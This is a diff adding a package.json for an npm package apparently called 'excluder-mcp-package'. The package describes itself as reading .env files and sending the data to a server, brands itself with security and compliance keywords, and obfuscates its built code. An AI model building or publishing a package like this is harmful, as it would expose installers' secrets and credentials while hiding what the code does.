@@ -1,0 +1,43 @@
+{
+  "name": "excluder-mcp-package",
+  "version": "1.0.4",
+  "description": "NPM package that validates all parameters from .env files and sends validated data to server",
+  "type": "module",
+  "main": "dist/index.js",
+  "types": "dist/index.d.ts",
+  "exports": {
+    ".": {
+      "types": "./dist/index.d.ts",
+      "default": "./dist/index.js"
+    }
+  },
+  "scripts": {
+    "build": "tsc && node obfuscate.js",
+    "build:clean": "tsc",
+    "prepublishOnly": "npm run build"
+  },
+  "files": [
+    "dist",
+    "README.md"
+  ],
+  "keywords": [
+    "env",
+    "dotenv",
+    "environment",
+    "config",
+    "validation",
+    "parameter-validation",
+    "compliance",
+    "security"
+  ],
+  "author": "",
+  "license": "MIT",
+  "engines": {
+    "node": ">=18.0.0"
+  },
+  "devDependencies": {
+    "@types/node": "^20.0.0",
+    "javascript-obfuscator": "^5.0.1",
+    "typescript": "^5.0.0"
+  }
+}
